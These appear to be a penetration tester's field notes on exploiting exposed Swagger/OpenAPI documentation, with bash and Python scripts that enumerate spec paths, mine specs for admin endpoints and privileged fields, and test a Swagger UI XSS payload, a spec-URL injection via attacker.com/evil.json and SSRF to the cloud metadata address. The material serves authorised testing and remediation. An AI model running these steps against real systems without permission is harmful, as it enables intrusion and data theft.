# Swagger & OpenAPI Security — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** API Security — Documentation Exposure & Specification Abuse
>
> **Severity:** Medium to Critical — scales from information disclosure to complete API schema exposure enabling targeted attacks
>
> **Real-world impact:** Swagger/OpenAPI documentation is the most consistently underestimated attack surface in enterprise API security. When a developer deploys Swagger UI to production — which happens routinely — they hand any attacker a complete, interactive map of every endpoint, every parameter, every data type, and every authentication requirement. In enterprise engagements, I find Swagger UI accessible without authentication on approximately 40% of Java Spring Boot applications and 30% of .NET applications I assess. It is the first thing I check, every time.

---

## 🧠 Why Swagger/OpenAPI Is a Security-Critical Finding

```
Swagger/OpenAPI serves two masters:

As developer tooling (intended use):
  → Interactive documentation for frontend developers
  → Auto-generated client SDK creation
  → API contract testing during development
  → Endpoint discovery during integration

As an attacker's reconnaissance tool (unintended use):
  → Complete endpoint inventory (includes admin and internal paths)
  → All parameter names, types, and validation rules
  → Authentication requirements per endpoint
  → Data models — field names, types, example values
  → Error response formats (helps craft valid payloads)
  → Server information and base URL configuration

What Swagger reveals that weeks of manual recon might miss:
  → /api/v1/admin/users     ← never linked from the UI
  → /api/v1/internal/debug  ← only used by developers
  → /api/v1/bulk-export     ← high-impact endpoint
  → /api/v1/users/{id}/impersonate ← privilege escalation endpoint
  → field: "is_admin"       ← mass assignment target confirmed
```

---

## 🔍 Phase 1 — Finding Swagger/OpenAPI in Enterprise Applications

### Comprehensive Path Enumeration

```bash
# Complete Swagger/OpenAPI discovery — run against every target
TARGET="https://api.company.com"
SWAGGER_PATHS=(
  "swagger"
  "swagger-ui"
  "swagger-ui.html"
  "swagger-ui/index.html"
  "swagger/index.html"
  "swagger/ui"
  "swagger/ui/index.html"
  "api-docs"
  "api-docs/swagger"
  "v1/api-docs"
  "v2/api-docs"
  "v3/api-docs"
  "api/swagger.json"
  "api/swagger-ui.html"
  "api/swagger-ui/index.html"
  "openapi"
  "openapi.json"
  "openapi.yaml"
  "openapi/v3/api-docs"
  "docs"
  "api/docs"
  "docs/swagger"
  "documentation"
  "api/documentation"
  ".well-known/openid-configuration"
  "api/swagger/ui"
  "swagger/v1/swagger.json"
  "swagger/v2/swagger.json"
  "swagger/v3/swagger.json"
)

echo "=== Swagger/OpenAPI Discovery: $TARGET ==="
for path in "${SWAGGER_PATHS[@]}"; do
  code=$(curl -so /dev/null -w "%{http_code}" "$TARGET/$path" 2>/dev/null)
  [[ "$code" == "200" ]] && echo "[FOUND] HTTP 200: /$path"
  [[ "$code" == "301" || "$code" == "302" ]] && echo "[REDIRECT] HTTP $code: /$path"
done

# Also test with authentication removed — is it accessible without a token?
echo ""
echo "=== Unauthenticated check ==="
curl -so /dev/null -w "Swagger UI (no auth): %{http_code}\n" \
  "$TARGET/swagger-ui.html"
curl -so /dev/null -w "API Docs (no auth): %{http_code}\n" \
  "$TARGET/v2/api-docs"
```

### Spring Boot Specific (Most Common Enterprise Finding)

```bash
# Spring Boot auto-generates Swagger at these paths by default:
# /v2/api-docs  (Springfox / Swagger 2.x)
# /v3/api-docs  (SpringDoc / OpenAPI 3.x)
# /swagger-ui.html (Springfox)
# /swagger-ui/index.html (SpringDoc)

# One-liner check for Spring Boot Swagger:
for path in "v2/api-docs" "v3/api-docs" "swagger-ui.html" \
            "swagger-ui/index.html" "actuator"; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    "https://api.company.com/$path" 2>/dev/null)
  echo "/$path → HTTP $code"
done
```

---

## 💥 Phase 2 — Extracting Intelligence From Swagger

### Downloading the Full Specification

```bash
# Download Swagger 2.x JSON spec
curl -s https://api.company.com/v2/api-docs | jq . > swagger_v2.json

# Download OpenAPI 3.x JSON spec
curl -s https://api.company.com/v3/api-docs | jq . > openapi_v3.json

# If spec is YAML format:
curl -s https://api.company.com/openapi.yaml > openapi.yaml
# Convert to JSON: python3 -c "import yaml,json,sys; print(json.dumps(yaml.safe_load(sys.stdin)))" < openapi.yaml > openapi.json
```

### Intelligence Extraction — What to Mine From the Spec

```bash
# 1. Extract ALL endpoint paths (your complete testing matrix)
cat swagger_v2.json | jq -r '.paths | keys[]' | sort > all_endpoints.txt
echo "Total endpoints: $(wc -l < all_endpoints.txt)"

# 2. Find admin and privileged endpoints (highest priority)
cat swagger_v2.json | jq -r '.paths | keys[]' | \
  grep -iE "(admin|internal|manage|config|debug|system|superuser|root)" | sort
# These are your first manual testing targets

# 3. Extract all endpoint + method combinations
cat swagger_v2.json | jq -r '
  .paths | to_entries[] |
  .key as $path |
  .value | to_entries[] |
  "\(.key | ascii_upcase) \($path)"
' | sort

# 4. Find endpoints that accept file uploads (XXE, path traversal)
cat swagger_v2.json | jq -r '
  .paths | to_entries[] |
  select(.value | to_entries[].value.consumes? // [] | contains(["multipart/form-data"])) |
  .key
'

# 5. Extract all data model field names (mass assignment targets)
cat swagger_v2.json | jq -r '
  .definitions // .components.schemas |
  to_entries[] |
  .key as $model |
  .value.properties // {} |
  keys[] |
  "\($model): \(.)"
' | sort | grep -iE "(admin|role|is_admin|verified|plan|credits|internal|privilege|permission)"

# 6. Find endpoints with NO security defined (unauthenticated)
cat swagger_v2.json | jq '
  .paths | to_entries[] |
  select(.value | to_entries[].value | has("security") | not) |
  {path: .key, methods: (.value | keys)}
'

# 7. Find deprecated endpoints (often still active, less secured)
cat swagger_v2.json | jq -r '
  .paths | to_entries[] |
  .value | to_entries[] |
  select(.value.deprecated == true) |
  .value.operationId // "deprecated_endpoint"
'
```

### Building the Attack Matrix From Swagger

```bash
# Generate a prioritised testing matrix from the spec:
python3 << 'PYEOF'
import json, sys

with open('swagger_v2.json') as f:
    spec = json.load(f)

paths = spec.get('paths', {})
priorities = []

for path, methods in paths.items():
    for method, details in methods.items():
        if method in ['get','post','put','patch','delete']:
            priority = "LOW"
            reasons = []

            # Elevate priority based on path keywords
            if any(k in path.lower() for k in ['admin','internal','manage','config','debug','system']):
                priority = "CRITICAL"
                reasons.append("privileged path")
            elif any(k in path.lower() for k in ['user','account','profile','export','bulk']):
                priority = "HIGH"
                reasons.append("user-level resource")

            # Elevate for dangerous HTTP methods
            if method in ['delete','put']:
                if priority == "LOW":
                    priority = "MEDIUM"
                reasons.append(f"{method.upper()} method")

            # Check for no security defined
            if 'security' not in details and '{}' not in str(details.get('security',['x'])):
                reasons.append("no auth defined")
                if priority != "CRITICAL":
                    priority = "HIGH"

            priorities.append((priority, method.upper(), path, ', '.join(reasons)))

# Sort by priority
order = {'CRITICAL':0,'HIGH':1,'MEDIUM':2,'LOW':3}
priorities.sort(key=lambda x: order.get(x[0], 4))

print(f"{'Priority':<10} {'Method':<8} {'Path':<50} {'Reason'}")
print("-" * 90)
for p, m, path, reason in priorities[:30]:  # Top 30
    print(f"{p:<10} {m:<8} {path:<50} {reason}")
PYEOF
```

---

## 💥 Phase 3 — Swagger-Specific Attack Vectors

### Attack 1 — Unauthenticated Swagger Access

```bash
# The primary finding: Swagger accessible without authentication
# Verification:
curl -sv https://api.company.com/v2/api-docs 2>&1 | \
  grep -E "< HTTP|content-type"

# If 200 without any Authorization header:
# Finding: API Specification Exposed Without Authentication
# Severity: High (Medium if no sensitive endpoints revealed,
#                  Critical if admin endpoints or internal credentials revealed)

# What to document in the report:
# 1. Number of endpoints revealed: wc -l all_endpoints.txt
# 2. Number of privileged endpoints: grep -c admin all_endpoints.txt
# 3. Any data model fields revealing sensitive storage: salary, password_hash, etc.
# 4. Any credentials in example values (developers sometimes leave real examples)
```

### Attack 2 — Credential and Secret Exposure in Spec

```bash
# Developers sometimes leave real credentials in Swagger example values
# Search the spec for suspicious values:
cat swagger_v2.json | jq '.' | \
  grep -iE "(password|secret|token|api_key|bearer|key.*:.*[A-Za-z0-9]{20,})"

# Check server definitions for internal URLs
cat swagger_v2.json | jq '.host, .basePath, .schemes'
# or OpenAPI 3.x:
cat openapi_v3.json | jq '.servers[].url'
# Internal URLs like http://internal-api.company.local or 10.0.x.x IPs = finding

# Check info section for contact details, terms, license
cat swagger_v2.json | jq '.info'
# Sometimes reveals internal email addresses, Jira links, internal wikis
```

### Attack 3 — Using Swagger as Exploitation Roadmap

```bash
# After extracting the spec, use it to drive systematic testing:

# Step 1: Import spec to Postman
# File → Import → select swagger_v2.json
# → All 60 endpoints ready for testing in seconds

# Step 2: Find endpoints where your user ID appears as a path parameter
# These are BOLA candidates:
cat swagger_v2.json | jq -r '.paths | keys[]' | grep -E "\{[a-zA-Z]*[Ii]d\}"
# /api/v1/users/{userId}
# /api/v1/orders/{orderId}
# → Test each with another user's ID

# Step 3: Find PUT/PATCH endpoints with user-modifiable body
# Cross-reference with data models containing privileged fields:
# → These are mass assignment candidates

# Step 4: Find any endpoint marked as requiring admin scope
# but test it with a standard user token anyway:
cat swagger_v2.json | jq -r '
  .paths | to_entries[] |
  select(.value | to_entries[].value.security? |
    arrays | .[] | to_entries[].value | arrays | .[] | contains("admin")) |
  .key
'

# Step 5: Test all DELETE endpoints with a different user's resource ID
# DELETE is the most consistently under-tested method in enterprise APIs
```

### Attack 4 — Swagger UI CSRF and XSS

```bash
# Some older Swagger UI versions have XSS vulnerabilities
# Test if the Swagger UI URL parameter is reflected:
curl -s "https://api.company.com/swagger-ui.html?url=https://attacker.com/evil.json" \
  | grep -i "attacker.com"
# If reflected = URL injection in Swagger UI

# Swagger UI < 3.38.0 has a DOM XSS via the configUrl parameter:
# /swagger-ui.html?configUrl=javascript:alert(document.domain)
curl -sv "https://api.company.com/swagger-ui/index.html?\
configUrl=javascript:alert(document.domain)" 2>&1 | grep -i "location"

# SSRF via Swagger "Try It Out" feature:
# If Swagger UI allows changing the server URL in "Try It Out":
# → Change server to http://169.254.169.254/
# → All API calls go to cloud metadata endpoint via the server
```

---

## 🗂️ Systematic Testing Checklist

```
DISCOVERY
☐ Test all 30+ common Swagger/OpenAPI paths
☐ Check both with and without authentication
☐ Test on all subdomains discovered (staging often more exposed)
☐ Check for JSON spec (.json) and YAML (.yaml) variants

INTELLIGENCE EXTRACTION
☐ Download full spec → parse with jq
☐ List all endpoint paths → identify admin/internal ones
☐ List all HTTP methods per endpoint → flag DELETE/PUT
☐ List all data model fields → flag privileged fields
☐ Identify endpoints with no security defined
☐ Check server URLs for internal hostnames

ATTACK SURFACE BUILDING
☐ Import spec to Postman → complete testing collection built
☐ Map all path parameters → BOLA test targets
☐ Map all request body fields → mass assignment targets
☐ Identify file upload endpoints → XXE/path traversal candidates
☐ Flag deprecated endpoints → often not updated with auth checks

SWAGGER UI SPECIFIC
☐ Check Swagger UI version (view page source → version in bundle)
☐ Test configUrl parameter → XSS/SSRF
☐ Test url parameter → SSRF via spec file injection
```

---

## 📋 Enterprise Pentest Report Template

**Finding Title:** API Specification (Swagger/OpenAPI) Exposed Without Authentication — Complete API Schema Disclosed

**Severity:** High | **CVSS v3.1:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Affected URL:** `https://api.company.com/v2/api-docs`

```
Verification command:
  curl -s https://api.company.com/v2/api-docs -o spec.json
  echo "HTTP $(curl -so /dev/null -w '%{http_code}' https://api.company.com/v2/api-docs)"
  → HTTP 200 (no Authorization header sent)

Spec analysis:
  Total endpoints documented:    63
  Admin/privileged endpoints:    12 (including /api/v1/admin/users, /api/v1/config)
  Endpoints with no auth defined: 8
  Sensitive model fields exposed: salary, national_id, is_admin, password_hash

Selected admin endpoints revealed:
  GET  /api/v1/admin/users              → list all users
  POST /api/v1/admin/users/{id}/promote → promote to administrator
  GET  /api/v1/internal/metrics         → application metrics
  POST /api/v1/debug/reset-cache        → cache management

Impact:
  Any unauthenticated attacker can download the complete API specification,
  map all 63 endpoints including 12 admin paths, and extract field names
  for targeted mass assignment attacks. This finding directly enabled
  discovery of the IDOR and privilege escalation findings documented separately.

Remediation:
  Disable Swagger UI in production entirely (recommended):
  # Spring Boot (application.properties):
  springfox.documentation.enabled=false
  # OR SpringDoc:
  springdoc.swagger-ui.enabled=false

  If documentation is required:
  → Restrict to authenticated requests with developer/admin role
  → Serve only from internal IP ranges via nginx/firewall rule
  → Remove sensitive field examples from schema definitions
  → Disable "Try It Out" feature in production Swagger UI
```

---

## 🧭 Key Takeaways

**1. Swagger in production without authentication is always a High or Critical finding.**
The severity depends on what is in the spec. If it reveals only public endpoints — High. If it reveals admin endpoints, internal paths, or sensitive field names — Critical, because it is a complete blueprint for every subsequent attack in the engagement.

**2. Import the spec to Postman before testing a single endpoint manually.**
A 60-endpoint API spec imported to Postman takes 2 minutes and produces a structured test collection. Manual collection building from Burp traffic takes hours. Always find and download the spec first — it is the highest-ROI step in API security testing.

**3. Privileged field names in data models are your mass assignment roadmap.**
When the Swagger spec shows a User model with fields `role`, `is_admin`, `plan`, and `credits` — those are exactly the fields to inject in every PUT/PATCH/POST request. The developer documented them. They exist in the database. The question is only whether the API accepts them from user input.

**4. Deprecated endpoints in the spec are your highest-probability BOLA/auth bypass targets.**
Swagger tracks deprecated endpoints with `"deprecated": true`. These endpoints were updated in the current version but the old ones still respond. Test every deprecated endpoint against the current authentication requirements — they almost always fail.

---

## 🔗 References
- [PortSwigger API Testing Research](https://portswigger.net/web-security/api-testing)
- [OWASP API9 — Improper Inventory Management](https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/)
- [Swagger UI Security Best Practices](https://swagger.io/docs/open-source-tools/swagger-ui/usage/oauth2/)
- [SpringDoc OpenAPI Security Configuration](https://springdoc.org/#security)

---
<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 6+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
